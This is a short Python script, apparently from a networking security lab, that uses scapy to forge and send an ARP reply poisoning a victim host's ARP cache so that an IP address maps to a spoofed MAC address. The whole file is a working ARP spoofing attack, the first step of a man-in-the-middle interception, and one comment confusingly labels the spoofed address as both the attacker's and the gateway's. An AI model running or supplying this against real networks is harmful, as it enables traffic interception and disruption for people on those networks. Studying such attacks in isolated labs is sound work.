#!/usr/bin/env python3
from scapy.all import *
from scapy.layers.l2 import ARP, Ether

IP_V = "10.9.0.5"              # Victim's IP address
MAC_V_REAL = "02:42:0a:09:00:05"  # Victim's MAC address
IP_T = "10.9.0.105"              # attacker's IP address (e.g., the gateway)
MAC_T_FAKE = "02:42:0a:09:00:69"  # Spoofed MAC address

# Constructing Ethernet and ARP packets
ether = Ether(src=MAC_T_FAKE, dst=MAC_V_REAL)
arp = ARP(psrc=IP_T,hwsrc=MAC_T_FAKE , pdst=IP_V ,hwdst=MAC_V_REAL)
arp.op = 2  # ARP reply

# Combining Ethernet and ARP layers
frame = ether / arp

# Sending the ARP spoof packet
sendp(frame)

